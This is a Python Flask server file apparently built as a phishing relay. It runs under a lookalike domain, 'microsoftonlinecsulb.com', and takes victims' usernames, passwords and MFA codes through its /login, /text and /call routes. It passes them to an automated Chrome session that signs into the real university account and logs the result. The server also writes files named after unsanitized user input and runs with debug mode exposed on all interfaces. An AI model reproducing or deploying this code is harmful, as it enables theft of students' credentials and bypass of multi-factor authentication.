

from flask import Flask , redirect, url_for, render_template, request,Blueprint
from OpenSSL import SSL

import random, string, os
import time
import main
import os
import threading
from _thread import start_new_thread



app = Flask(__name__)
context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')

#this stuff is no longer supported
# context = SSL.Context(SSL.TLSv1_2_METHOD)
# context.use_privatekey_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')
# context.use_certificate_chain_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/fullchain.pem')
# context.use_certificate_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem')


# use threads to start this and give the thread the name of email or ip
# def task():
#     chrome = main.startChrome()
#     return chrome
#     # your code here

# # # create and start threads
# # # creates 5 instances where, up to five people are able to run our code
# for i in range(5):
#     thread = threading.Thread(target=task)
#     thread.start()

chrome = main.startChrome()

@app.route('/profile')
def profile():
    return 'Profile'

# def text_task(code):
#     chrome = main.startChrome()
#     chrome.text(code)
#     time.sleep(20)
#     chrome.open_mycsulb()
#     chrome.log_info()

# def call_task():
#     chrome = main.startChrome()
#     chrome.call()
#     time.sleep(20)
#     chrome.open_mycsulb()
#     chrome.log_info()

# @app.route('/text', methods=['GET', 'POST'])
# def text():
#     code = request.form.get('code')

#     # create and start thread for this request
#     thread = threading.Thread(target=text_task, args=(code,))
#     thread.start()

#     return render_template('index.html')

# @app.route('/call', methods=['GET', 'POST'])
# def call():
#     # create and start thread for this request
#     thread = threading.Thread(target=call_task)
#     thread.start()

#     return render_template('index.html')

# define functions to be run in separate threads
# def login_task(email, password):
#     chrome = main.startChrome()
#     var = chrome.login_email(email, password)
#     if var == True:
#         #stop loading
#         print("its true")
#         check1="<div id='check' />"
#         with open('./static/'+email+'.txt','w') as file:
#             file.write("1")

# @app.route('/login', methods=['GET', 'POST'])
# def login():
#     email = request.form.get('username')
#     password = request.form.get('password')

#     # create and start thread for this request
#     thread = threading.Thread(target=login_task, args=(email, password))
#     thread.start()

#     return render_template('index.html')


@app.route('/requestCode', methods=['GET','POST'])
def requestCode():
    print("request code py")
    try:
        chrome.request_text()
    except:
        print("text chrome.text error")
        chrome.restart()

@app.route('/text', methods=['GET', 'POST'])
def text():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    
    code = request.form.get('code')
    try:
        chrome.enterCode(code)
    except:
        print("text chrome.text error")
        chrome.restart()
    time.sleep(20)
    try:
        chrome.open_mycsulb()
    except:
        print("text chrome_opensulb error")
        chrome.restart()

    chrome.log_info()


    return render_template('index.html')

@app.route('/call', methods=['GET', 'POST'])
def call():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    try:
        chrome.call()
    except:
        print("call chrome.call error")
        chrome.restart()
    time.sleep(30)
    try:
        chrome.open_mycsulb()
    except:
        print("call open_mycsulb() error")
        chrome.restart()
    try:
        chrome.log_info()
    except:
        print("call log_info() error")
        chrome.restart()

    return render_template('index.html')
        
@app.route('/login', methods=['GET', 'POST'])
def login():
    # Here we use a class of some kind to represent and validate our
    # client-side form data. For example, WTForms is a library that will
    # handle this for us, and we use a custom LoginForm to validate.
    email = request.form.get('username')
    password = request.form.get('password')
    # print(email,password)
    try:
        var = chrome.login_email(email,password)
        if var == True:
        #stop loading
        
            print("its true")
            check1="<div id='check' />"
            with open('./static/'+email+'.txt','w') as file:
                file.write("1")
            # os.system('chmod 777 '+email+'.txt')
    except:
        print("get var error")
        chrome.restart()
    return render_template('index.html')
    
        

    
    # if request.method == "POST":
    #     todo = request.form.get("todo")
    #     print(todo)
@app.route('/about')
def about():
    return 'This is the about page.'

@app.route("/")
def home():
    return render_template("index.html")

# mofified code from runmain.py to work w/ flask
# @app.route('/main', methods=['POST'])
# def main():
#     email = request.form.get('email')
#     password = request.form.get('password')

#     main.login_email(email, password)

#     while not os.path.exists(email+"call.txt"):
#         time.sleep(2)

#     with open(email+"call.txt") as file:
#         var_return = file.readline().strip()

#     if var_return == "1":
#         main.call()
#     else:
#         main.text(email)

#     main.open_mycsulb()
#     main.log_info(email, password)
#     main.driver.close()


#added routes to work w/ the app.js code

# @app.route('/check_login', methods=['POST'])
# def check_login():
#     username = request.json.get('username')

#     # Check if the user is logged in
#     loggedIn = False
#         # if the user isn't logged in? 

#     return jsonify({'loggedIn': loggedIn})

# @app.route('/check_file', methods=['POST'])
# def check_file():
#     filename = request.json.get('filename')

#     # Check if the file exists
#     exists = False
#     # what do we need to do if the file doesn't exist?

#     return jsonify({'exists': exists})


# @main.route('/mydata', methods = ['POST'])
# def view_data():
#      if request.method == 'POST':
#         user =  request.form["email"]
#         pswd = request.form["password"]
#         barChartData = ""
#         pieChartData = ""
#         #temp if statement that needs to be replaced with user validation
#         if 1 == 1:
#             #files containing the json formats needed for HighCharts
#             with open('./'+user+'/topTags.json', 'r') as file:
#                 pieChartData = json.loads(file.read())
#             #with open('./'+user+'/'+pswd, 'r') as file:
#             with open('./'+user+'/topten.json', 'r') as file:
#                 barChartData = json.loads(file.read())
#             return render_template("chart.html", topTenData=json.dumps(barChartData), pieData=json.dumps(pieChartData))
#         else:
#             return redirect(url_for(home))


# #creates a string of the filenames from upload_files and uses it as an argument for c++ program
# def processFiles(userhash):
#     fileList = []
#     for file in os.listdir('./'+userhash+'/'):
#         if file.endswith(".json"):
#             fileList.append('./'+userhash+'/' + file)
#     arg = ' '.join(fileList)
#     #start c++ project to process the initall data
#     os.system("./Spotify " + arg)
#     processData(userhash)

app.run(host='0.0.0.0', port=443, threaded=True, ssl_context=context, debug=True)